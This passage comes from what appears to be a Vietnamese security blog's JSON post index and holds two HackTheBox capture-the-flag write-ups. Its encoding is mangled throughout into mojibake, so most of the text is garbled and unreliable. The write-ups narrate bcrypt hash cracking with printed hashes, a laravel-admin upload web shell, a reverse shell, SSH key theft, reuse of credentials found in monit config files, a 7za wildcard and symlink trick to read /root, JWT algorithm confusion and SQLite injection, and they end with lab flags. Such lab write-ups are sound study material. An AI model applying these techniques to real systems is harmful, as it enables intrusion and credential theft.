ThÃ´i thÃ¬ mÃ¬nh sáº½ thá»­ vá»›i cÃ´ng cá»¥ tháº§n thÃ¡nh hashcat xem sao.Sau gáº§n 3 tiáº¿ng ngá»“i crack báº±ng hashcat nhÆ°ng váº«n khÃ´ng nháº­n Ä‘Æ°á»£c káº¿t quáº£, mÃ¬nh chuyá»ƒn sang hÆ°á»›ng tim cÃ¡c user thÆ°á»ng xem cÃ³ idea gÃ¬ má»›i khÃ´ng.Quay láº¡i vá»›i báº£ng users.  ÄÃ£ tÃ¬m Ä‘Æ°á»£c thÃ´ng tin cÃ¡c user trong báº£ng usersraj@raj.com:$2y$10$7almtteyfrvd8rnyep/ck.bsfkfxfsltplkyqqsp/tt7x1wapjt4.raj@usage.htb:$2y$10$rbncgxpwp1hspo1gqx4upo.pdg1nszoi/uhwhvfhddfdfo9vmdjsaa@gmail.com:$2y$10$40rwm43ejd7p04jgtvdm7exuw1ygu7thg5r6bwmtwgmkiegpg.zayb@gmail.com:$2y$10$nctkiwzoakyk0jhvstkhfonm6qvoeoodklb8ymisv69bwhgsyjko6Ngoáº¡i trá»« 2 account a vÃ  b mÃ¬nh táº¡o ra thÃ¬ cÃ²n láº¡i 2 account raj@raj.com vÃ  raj@usage.htb. Thá»­ crack bcrypt cá»§a nÃ³ xem nhÆ° tháº¿ nÃ o ?Hashcat cháº¡y quÃ¡ lÃ¢u, mÃ  mÃ¬nh quÃªn máº¥t ngoÃ i hashcat ra thÃ¬ váº«n cÃ²n john ripper tháº§n thÃ¡nh. Chuyá»ƒn qua sá»­ dá»¥ng john xem cÃ³ tiáº¿n triá»ƒn gÃ¬ hÆ¡n khum.Trá»i tháº­t khÃ´ng phá»¥ lÃ²ng ngÆ°á»i, cuá»‘i cÃ¹ng cÅ©ng crack Ä‘Æ°á»£c pass admin. Login tÃ¬m Ä‘Æ°á»ng RCE thÃ´i nÃ o !!!!Ngol lÃ nh luÃ´n.Sau khi Ä‘i 1 vÃ²ng táº¥t cáº£ cÃ¡c chá»©ng nÄƒng sau khi login. ThÃ¬ chá»‰ cÃ³ form táº¡o hoáº·c sá»­a user lÃ  cÃ³ chá»©c nÄƒng upload =&amp;gt; cÃ³ kháº£ nÄƒng lÃªn shell.Tuy nhiÃªn Ä‘á»i k nhÆ° lÃ  mÆ¡. Chá»©c nÄƒng cÃ³ cÅ©ng nhÆ° khÃ´ng. API thÃ¬ cháº¡y nhÆ°ng user láº¡i k Ä‘Æ°á»£c táº¡o ra. ÄI theo avatar cá»§a user admin Ä‘á»ƒ tÃ¬m nÆ¡i chá»©a hÃ¬nh áº£nh Ä‘Ã£ up Ä‘á»ƒ trigger shell nhÆ°ng cÅ©ng k Ä‘Æ°á»£c. =&amp;gt; Quay xe thÃ´i.Quay láº¡i quÃ¡ trÃ¬nh recon web ban Ä‘áº§u. MÃ¬nh váº«n cÃ²n cÃ¡c version chÆ°a biáº¿t cÅ© má»›i. Äáº§u tiÃªn lÃ  nginx 1.18.0Kháº£ nÄƒng cao lÃ  cÃ³ CVE vÃ¬ mÃ¬nh nghi Ä‘Ã¢y chÆ°a pháº£i version latest. Google xÃ­u nÃ o.POC cÃ¡c thá»© 1 há»“i váº«n k Äƒn thua =&amp;gt; Láº¡i quay xe tÃ¬m Ä‘Æ°á»£c khÃ¡c thÃ´i.NhÆ° hÃ¬nh trÃªn thÃ¬ version cá»§a PHP vs Laravel chÆ°a Ä‘Æ°á»£c list ra. Ã€ hÃ¡ hÃ¬nh nhÆ° khi login vÃ o dashboard nÃ³ Ä‘Æ°á»£c hiá»‡n thá»‹.PHP 8.1.2 cÃ³ váº» khÃ¡ to. ThÃ´i thá»­ tÃ¬m Laravel xem s, nhÃ¬n ver nhá» hÆ¡n nhiá»u so vá»›i latest.NÃ³ Ä‘Ã¢y rá»“i, thá»­ xem POC Ä‘Æ°á»£c khum nha.Láº¡i khÃ³ rá»“i mÃ¬nh thiáº¿u file .log cá»§a laravel nÃªn khÃ³ mÃ  POC Ä‘Æ°á»£c. ThÃ´i thÃ¬ bung js ra Ä‘á»c thÃ´i.VÃ¬ endpoint mÃ¬nh cÅ©ng Ä‘Ã£ Ä‘i háº¿t rá»“i, tÃ¬m version POC CVE thÃ¬ cÅ©ng váº­y. =&amp;gt; Viá»‡c Ä‘á»c js Ä‘á»ƒ tÃ¬m gÃ¬ nhá»‰ ? kkkkk táº¥t nhiÃªn lÃ  sáº½ tÃ¬m nhá»¯ng endpoint hoáº·c version áº©n nÃ o Ä‘Ã³. áº®t háº³n lÃ  cÃ¡c báº¡n Ä‘ang tháº¯c máº¯c version áº©n lÃ  gÃ¬ Ä‘Ãºng khÃ´ng. VÃ¬ Ä‘Ã¢y lÃ  CMS Laravel nÃ³ na nÃ¡ nhÆ° Wordpress váº­y Ã¡ nÃªn viá»‡c quáº£n trá»‹ viÃªn sá»­ dá»¥ng thÃªm cÃ¡c plugin thá»© 3 lÃ  cÃ³ thá»ƒ cÃ³.Search keyword version thÃ¬ cÃ³ 3 káº¿t quáº£.2 káº¿t quáº£ Ä‘áº§u Ä‘Ã£ Ä‘Æ°á»£c hiá»‡n thá»‹ á»Ÿ dashboard rá»“i. Váº­y cÃ²n káº¿t quáº£ thá»© 3 lÃ  gÃ¬ nhá»‰ ?Version 1.8.17 nhÆ°ng cá»§a cÃ¡i gÃ¬ thÃ¬ mÃ¬nh cÅ©ng k rÃµ chá»‰ Ä‘oÃ¡n Ä‘Ã¢y lÃ  1 plugin nÃ o Ä‘Ã³ cá»§a Laravel. KhÃ´ng biáº¿t thÃ¬ google thÃ´i chá»© dÃ¬ Ä‘ou mÃ  ngáº¡i kkkkNgá»“i google má»™t lÃºc lÃ¢u má»›i phÃ¡t hiá»‡n version 1.8.17 nÃ y lÃ  cá»§a laravel-admin. May thay mÃ¬nh Ä‘i lÃ²ng vÃ²ng trÃªn khÃ´ng gian máº¡ng thÃ¬ lÃ²i ra Ä‘Æ°á»£c cÃ¡i site nÃ³i vá» CVE cá»§a laravel-admin nÃ y. NÃ³ láº¡i cÃ²n cÃ³ vÃ­ dá»¥ ik chang cÃ¡i site mÃ¬nh Ä‘ang attack ná»¯a chá»©.Ã Ä‘Ã¹ nÃ³ chÃ­nh lÃ  cÃ¡i chá»©c nÄƒng upload mÃ  há»“i nÃ£y mÃ¬nh Ä‘Ã£ attack nhÆ°ng nghÄ© nÃ³ k work. LÃ m theo sÃ¡ch giao khoa khÃ´ng up shell Ä‘Æ°á»£c thÃ¬ bÃ¢y giá» mÃ¬nh thá»­ lÃ m theo cuá»‘n chÃ¢n kinh mÃ¬nh má»›i tÃ¬m Ä‘Æ°á»£c xem sao nhá»‰.Yeah cuá»‘i cÃ¹ng cÅ©ng lÃªn Ä‘Æ°á»£c con shell gháº» kkkk.  Loay hoay 1 há»“i vÃ o Ä‘á»c chÃ¢n kinh má»›i ngá»™ ra ráº±ng. CÃ¡i chá»©c nÄƒng upload á»Ÿ function táº¡o user k work thiá»‡t. MÃ  pháº£i sá»­ dá»¥ng chá»©c nÄƒng upload á»Ÿ function edit user admin.Khi lÃªn Ä‘Æ°á»£c shell thÃ¬ viá»‡c láº¥y flag Ä‘áº§u tiÃªn ez rá»“i.Privilege EscalationHÃ¬nh nhÆ° khu vá»±c nÆ¡i chá»©a file upload cá»§a admin Ä‘ang Ä‘Æ°á»£c cháº¡y 1 script auto táº¡o láº¡i file avatar cá»§a admin. NÃªn cá»© up web shell lÃªn chÆ°a Ä‘Æ°á»£c 10p thÃ¬ web shell cá»§a mÃ¬nh bá»‹ xoÃ¡ vÃ  trá»Ÿ láº¡i lÃ  hÃ¬nh avatar cá»§a admin. HÆ¡i khÃ³ cháº¹o nÃªn mÃ¬nh quyáº¿t Ä‘á»‹nh sáº½ up má»™t con reverse shell vÃ o thÆ° má»¥c /tmp.OK, cÃ³ revershell thÃ nh cÃ´ng. NhÆ°ng con reverseshell nÃ y váº«n cÃ²n khÃ³ cháº¹o, mÃ¬nh k thá»ƒ sudo hay lÃ m 1 vÃ i thao tÃ¡c nÃ¢ng cao. NÃªn cháº¯c mÃ¬nh sáº½ tÃ¬m cÃ¡ch get Ä‘Ãºng shell cá»§a user dash trÆ°á»›c khi leo quyá»n.Idea cÆ¡ báº£n nháº¥t lÃ  mÃ¬nh sáº½ tÃ¬m cÃ¡ch láº¥y key ssh vÃ¬ há»“i lÃºc recon mÃ¬nh nhá»› váº«n cÃ²n port 22 chÆ°a Ä‘á»¥ng Ä‘áº¿n.Yeah Ä‘i vÃ o profile user vÃ  thÆ° má»¥c máº·c Ä‘á»‹nh cá»§a ssh lÃ  sáº½ tháº¥y thÃ´i. (/home/user/.ssh/).Yeah ngol lÃ nh, báº¯t cÃ¡i thang lÃªn leo thÃ´i.Gáº§n nhÆ° cÃ¡c ká»¹ thuáº­t leo quyá»n cÆ¡ báº£n Ä‘á»u khÃ´ng kháº£ dá»¥ng trong trÆ°á»ng há»£p nÃ y.Yeah cÃ¡c binary dÆ°á»›i Ä‘Ã¢y Ä‘ang Ä‘Æ°á»£c cháº¡y vá»›i quyá»n root. TÃ¬m cÃ¡ch hÃºp nÃ³ thÃ´i.MÃ¬nh sáº½ focus vÃ o cÃ¡c binary trong nhÃ³m /usr/bin trÆ°á»›c. MÃ¬nh nghÄ© Ä‘a sá»‘ cÃ¡c binary nÃ y Ä‘Ã£ tá»«ng cÃ³ Ã­t nháº¥t 1 CVE nÃ o Ä‘Ã³. ThÃ´i thÃ¬ mÃ¬nh sáº½ check version cá»§a tá»«ng binary rá»“i so vá»›i cÃ¡c CVE cá»§a chÃºng thá»­ xem cÃ³ thá»ƒ khai thÃ¡c cÃ¡i nÃ o hay k nhÃ©.Äi má»™t vÃ²ng thÃ¬ mÃ¬nh phÃ¡t hiá»‡n ra tháº±ng pkexec cÃ³ váº» phÃ¹ há»£p vÃ  cÅ©ng cÃ³ sáºµn POC trÃªn git luÃ´n. Chá» dÃ¬ ná»¯a mÃ  k thá»­ exploit.TÆ°á»Ÿng dá»… Äƒn nhÆ°ng váº«n k Äƒn Ä‘Æ°á»£c. Láº¡i pháº£i quay xe. Chá»£t nhá»› ra tÃ´i chÆ°a kiá»ƒm tra xem internal cÃ³ Ä‘ang má»Ÿ port nÃ o cÃ³ thá»ƒ tunnel ra ngoÃ i Ä‘Æ°á»£c khum nhá»‰ ?Váº«n khÃ´ng tÃ¬m tháº¥y gÃ¬ hot haizzz. Quáº±ng quÃ¡ bá» Ä‘i chÆ¡i â€¦â€¦Sau khi Ä‘i chÆ¡i vá» mÃ¬nh láº¡i tiáº¿p tá»¥c connect vÃ o ssh vÃ  Ä‘i lÃ²ng vÃ²ng xem cÃ³ gÃ¬ hot Ä‘á»ƒ khai thÃ¡c khÃ´ng. Láº§n nÃ y mÃ¬nh mÃ² lÃ²ng vÃ²ng trong src web láº«n profile user. Máº·c dÃ¹ mang tiáº¿ng lÃ  dÃ¹ng linux nhiá»u hÆ¡n dÃ¹ng win nhÆ°ng nhÃ¬n vÃ o profile user váº«n cÃ³ nhiá»u file mÃ¬nh khÃ´ng thá»ƒ hiá»ƒu Ä‘Æ°á»£c.MÃ¬nh tháº¯c máº¯c cÃ¡c file nhÆ° .lesshst, monit* lÃ  gÃ¬ nhá»‰ ? KhÃ´ng hiá»ƒu thÃ¬ há»i thÃ´i, Ä‘em lÃªn google há»i nÃ o.ThÃ¬ ra file .lesshst lÃ  file lá»‹ch sá»­ Ä‘Æ°á»£c táº¡o ra bá»Ÿi lá»‡nh less.CÃ²n cÃ¡c file .monit* lÃ  do server Ä‘ang cháº¡y má»™t dá»‹ch vá»¥ monitor (giÃ¡m sÃ¡t) mÃ£ nguá»“n má»Ÿ. NÃ³ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ theo dÃµi vÃ  quáº£n lÃ½ cÃ¡c dá»‹ch vá»¥, tiáº¿n trÃ¬nh, vÃ  tÃ i nguyÃªn há»‡ thá»‘ng trÃªn cÃ¡c há»‡ Ä‘iá»u hÃ nh giá»‘ng Unix. Google sÃ¢u vá» dá»‹ch vá»¥ nÃ y thÃ¬ mÃ¬nh tháº¥y thÃ´ng thÆ°á»ng nÃ³ sáº½ open má»™t port 2812 Ä‘á»ƒ quáº£n trá»‹ viÃªn cÃ³ thá»ƒ dá»… dÃ ng quáº£n trá»‹ server tá»« xa thÃ´ng qua trÃ¬nh duyá»‡t. Tháº¿ thÃ¬ ngáº¡i gÃ¬ mÃ  k thá»­ truy cáº­p vÃ o port Ä‘Ã³ xem ntn nhá»‰.LÆ°á»i má»Ÿ trÃ¬nh duyá»‡t qÃ¡ nÃªn mÃ¬nh dÃ¹ng curl luÃ´n. NÃ³ kÃªu mÃ¬nh k cÃ³ quyá»n. MÃ¬nh Ä‘ang Ä‘á»©ng á»Ÿ server cháº¡y nÃ³ mÃ  nÃ³ dÃ¡m lÃ m khÃ³ mÃ¬nh. Äá»c thá»­ cÃ¡c file monit* xem cÃ³ gÃ¬ hot nÃ o.á»i cÃ³ tÃ i khoáº£n admin kÃ¬a.Hmmm, trÃ¬nh duyá»‡t thÃ¬ k dÃ¹ng Ä‘Æ°á»£c tháº¿ thÃ¬ tÃ i khoáº£n nÃ y dÃ¹ng Ä‘á»ƒ lÃ m gÃ¬ cÃ  ? MÃ¬nh váº«n cÃ²n tÃ i khoáº£n xander vÃ  root chÆ°a login Ä‘Æ°á»£c. NhÆ°ng tÃ i khoáº£n dash mÃ¬nh váº«n chÆ°a cÃ³ password. Thá»­ háº¿t cáº£ 3 tÃ i khoáº£n xem ntn.NÃ³ lÃ  tháº±ng xander. Tháº±ng nÃ y cÃ³ dÃ¬ nhá»‰. Láº¡i mÃ² profile nÃ³ thÃ´i kkkkkMáº·c dÃ¹ biáº¿t lÃ  k Ä‘Æ°á»£c Ä‘Ã¢u nhÆ°ng váº«n cá»‘ cháº¥p xem ntn kkkkLeo root Ä‘Ã£ trá»Ÿ nÃªn dá»… dÃ ng hÆ¡n khi báº¡n cÃ³ password vÃ  cháº¡y Ä‘Æ°á»£c lá»‡nh sudo -l ğŸ¤£ğŸ¤£ğŸ¤£NÃ³ lÃ  má»™t file binary do quáº£n trá»‹ dev. Hmm k láº½ RE file nÃ y Ä‘á»ƒ Ä‘á»c code nÃ³ ta ğŸ¤”. Thá»­ strings nÃ³ ra trÆ°á»›c xem cÃ³ chuá»—i j hay ho k Ä‘Ã£.HÃªn quÃ¡ cÅ©ng cÃ³ ná»™i dung mÃ¬nh cáº§n. Option 1 thÃ¬ nÃ³ dÃ¹ng 7za Ä‘á»ƒ nÃ©n file nhÆ° mÃ¬nh Ä‘Ã£ tÃ´ tráº¯ng trÃªn hÃ¬nh. Option 2 thÃ¬ nÃ³ dÃ¹ng mysqldump Ä‘á»ƒ dump file .sql cÃ¡ch Ä‘Ã³ 2 dÃ²ng.NhÃ¬n vÃ o 3 dÃ²ng nÃ y mÃ¬nh Ä‘oÃ¡n lÃ  khi cháº¡y option 1 nÃ³ sáº½ nÃ©n thÆ° má»¥c /var/www/html thÃ nh file /var/backups/project.zip.Äiá»u mÃ¬nh quan tÃ¢m á»Ÿ Ä‘Ã¢y lÃ  dáº¥u wildcard *. NÃ³ sáº½ thÃªm táº¥t cáº£ cÃ¡c thÆ° má»¥c hoáº·c file á»Ÿ thÆ° má»¥c hiá»‡n táº¡i vÃ o file zip. Váº­y giáº£ sá»­ thÆ° má»¥c hiá»‡n táº¡i chÃ­nh lÃ  thÆ° má»¥c /root thÃ¬ sáº½ nhÆ° tháº¿ nÃ o nhá»‰ ?Idea á»Ÿ Ä‘Ã¢y lÃ  mÃ¬nh sáº½ sá»­ dá»¥ng má»™t symbol link trá» tá»« /root Ä‘áº¿n /var/www/html.Viá»‡c cÃ²n láº¡i lÃ  mÃ¬nh giáº£i nÃ©n file zip Ä‘Ã³ ra lÃ  sáº½ láº¥y Ä‘Æ°á»£c flag bÃªn trong thÆ° má»¥c /rootNhÆ°ng chuyá»‡n khÃ´ng dá»… Ä‘áº¿n tháº¿ mÃ¬nh láº¡i k cÃ³ quyá»n giáº£i nÃ©n nÃ³. Hmmm quay láº¡i Ä‘á»c hÆ°á»›ng dáº«n sá»­ dá»¥ng cá»§a 7za váº­y.Yeah âœŒğŸ»âœŒğŸ»âœŒğŸ» thÃ nh cÃ´ng. Done.Káº¿t luáº­nFlag 1ba52a4d7c85dc89d0e3433fdfc8d2f58Flag 2328080f50550138cc4d1cfeddabf81ac"
  },
  
  {
    "title": "Under Construction",
    "url": "/posts/under-construction/",
    "categories": "HackTheBox, Easy",
    "tags": "HTB, Under_Construction",
    "date": "2022-02-02 00:00:00 +0700",
    





    "snippet": "HTB-Under-ConstructionVÃ o dá»‹p cuá»‘i nÄƒm trong lÃºc má»i ngÆ°á»i Ä‘ang báº­n rá»™n dá»n dáº¹p nhÃ  cá»­a, sáº¯p sá»­a Ä‘á»“ má»›i Ä‘Ã³n táº¿t thÃ¬ mÃ¬nh nháº­n Ä‘Æ°á»£c má»™t challenge HackTheBox á»Ÿ má»©c medium tá»« má»™t ngÆ°á»i anh vá»«a má»›i quen qua má»™t nhÃ³m há»c táº­p trÃªn facebook.Challenge nÃ y cho mÃ¬nh háº³n source web, sau khi táº£i source vá» vÃ  wow NodeJs, mÃ¬nh mÃ¹ tá»‹t vá»›i ngÃ´n ngá»¯ nÃ y :((. Äi sÆ¡ qua má»™t vÃ²ng mÃ¬nh tháº¥y cÃ³ 2 file JWWTHelper.js vÃ  DBHelper.js lÃ m mÃ¬nh nghÄ© Ä‘áº¿n JWT attack vÃ  SQL injection. Äá»c qua file DBHelper.js tháº¥y Ä‘Æ°á»£c cÃ¡c cÃ¢u truy váº¥n khÃ´ng Ä‘Æ°á»£c lá»c kÄ© cÃ ng gÃ¬ cáº£. NhÆ°ng mÃ¬nh láº¡i chÆ°a biáº¿t lÃ m tháº¿ nÃ o Ä‘á»ƒ cÃ³ thá»ƒ inject vÃ o cÃ¡c cÃ¢u truy váº¥n Ä‘Ã³ Ä‘Æ°á»£c. ThÃ´i thÃ¬ quay qua Ä‘á»c file JWTHelper.js xem nhÆ° tháº¿ nÃ o.CÃ³ váº» nhÆ° lÃ  public key Ä‘Æ°á»£c lá»“ng á»Ÿ trong token cá»§a user (mÃ¬nh Ä‘oÃ¡n váº­y kkkk). Äá»ƒ cháº¯c cháº¯n cho suy Ä‘oÃ¡n cá»§a mÃ¬nh thÃ¬ mÃ¬nh Ä‘Ã£ Ä‘Äƒng kÃ½ má»™t user vÃ  Ä‘Äƒng nháº­p vá»›i user vá»«a táº¡o Ä‘á»ƒ láº¥y giÃ¡ trá»‹ session Ä‘em lÃªn JWT.io kiá»ƒm chá»©ng.Bá»Ÿi vÃ¬ cÃ³ public key nÃªn mÃ¬nh nghÄ© cháº¯c cháº¯n pháº£i cÃ³ gÃ¬ Ä‘Ã³ liÃªn quan Ä‘áº¿n authen. Thá»­ google má»™t vÃ²ng vá»›i tá»« khoÃ¡ JWT authen attack. MÃ¬nh phÃ¡t hiá»‡n Ä‘Æ°á»£c hacktricks cÃ³ viáº¿t vá» kÄ© thuáº­t thay Ä‘á»•i thuáº­t toÃ¡n tá»« RS256 sang HS256. Check láº¡i thuáº­t toÃ¡n JWT á»Ÿ challenge nÃ y thÃ¬ tÃ¬nh cá» tháº¥y nÃ³ dÃ¹ng thuáº­t toÃ¡n HS256. Google theo kÄ© thuáº­t nÃ y mÃ¬nh Ä‘Ã£ Ä‘Æ°á»£c thÃ´ng nÃ£o.Do thuáº­t toÃ¡n HS256 sá»­ dá»¥ng khoÃ¡ bÃ­ máº­t Ä‘á»ƒ Ä‘Ã¡nh dáº¥u vÃ  xÃ¡c thá»±c má»—i message, cÃ²n thuáº­t toÃ¡n RS256 thÃ¬ sá»­ dá»¥ng private key Ä‘á»ƒ Ä‘Ã¡nh dáº¥u message vÃ  public key Ä‘á»ƒ xÃ¡c thá»±c athen. VÃ¬ váº­y, náº¿u thay Ä‘á»•i tá»« thuáº­t toÃ¡n RS256 sang HS256 thÃ¬ public key sáº½ Ä‘Æ°á»£c sá»­ dá»¥ng nhÆ° khoÃ¡ bÃ­ máº­t vÃ  khi Ä‘Ã³ thuáº­t toÃ¡n HS256 dÃ¹ng Ä‘á»ƒ xÃ¡c thá»±c chá»¯ kÃ½.Sau khi thá»±c hiá»‡n theo cÃ¡c bÆ°á»›c á»Ÿ site trÃªn mÃ¬nh Ä‘Ã£ táº¡o ra Ä‘Æ°á»£c má»™t token má»›i vá»›i thuáº­t toÃ¡n HS256 vÃ  user admin. Tiáº¿n hÃ nh inject token má»›i Ä‘á»ƒ bypass authen thÃ¬ mÃ¬nh láº¡i nháº­n Ä‘Æ°á»£c má»™t káº¿t quáº£ khÃ¡ lÃ  há»¥t háº«n vá»›i thÃ´ng tin lÃ  user admin khÃ´ng tá»“n táº¡i :((((.Trong message á»Ÿ hÃ¬nh trÃªn cÃ³ nháº¯c Ä‘áº¿n database mÃ¬nh nghÄ© ngay Ä‘áº¿n file DBHelper.js lÃºc nÃ£y. Trong file mÃ¬nh tháº¥y cÃ³ hÃ m checkUser. MÃ¬nh Ä‘oÃ¡n kiá»ƒu gÃ¬ khi login hÃ m nÃ y cÅ©ng Ä‘Æ°á»£c gá»i ra.Vá»›i kinh nghiá»‡m Ä‘Ã£ tá»«ng dev web laravel mÃ¬nh check thá»­ má»™t vÃ²ng trong thÆ° má»¥c routes. Cuá»‘i cÃ¹ng mÃ¬nh cÅ©ng Ä‘Ã£ tÃ¬m Ä‘Æ°á»£c route login.Khi login hÃ m checkUser sáº½ Ä‘Æ°á»£c gá»i ra vÃ  truy váº¥n xuá»‘ng database. Input truyá»n vÃ o chÃ­nh lÃ  username náº±m trong pháº§n data cá»§a token.MÃ¬nh cÅ©ng khÃ´ng rÃµ láº¯m vá» cÃº phÃ¡p cá»§a sqlite nÃªn mÃ¬nh chÃ¨n Ä‘áº¡i cÃº phÃ¡p union cá»§a mysql xem káº¿t quáº£ tráº£ vá» nhÆ° tháº¿ nÃ o :))).Wow chÃ­nh nÃ³, chÃ­nh lÃ  sql injection Ä‘Ã¢y mÃ . Do khÃ´ng rÃ nh vá» cÃº phÃ¡p sqlite nÃªn mÃ¬nh google dÃ¹ng má»™t vÃ i payload trÃªn git.Tháº£ nháº¹ payload Extract table name thÃ¬ mÃ¬nh cÃ³ Ä‘Æ°á»£c table flag_storageHy vá»ng flag náº±m trong table nÃ y. Minh tiáº¿p tá»¥c láº¥y cá»™t trong table vÃ  ná»™i dung cá»§a cá»™t chá»©a flag.Äem flag vá»«a tÃ¬m lÃªn HTB submit  thÃ nh cÃ´ng.POCCÃ¡m Æ¡n cÃ¡c báº¡n Ä‘Ã£ ghÃ© qua Ä‘Ã¢y :))))"
  }
  
]

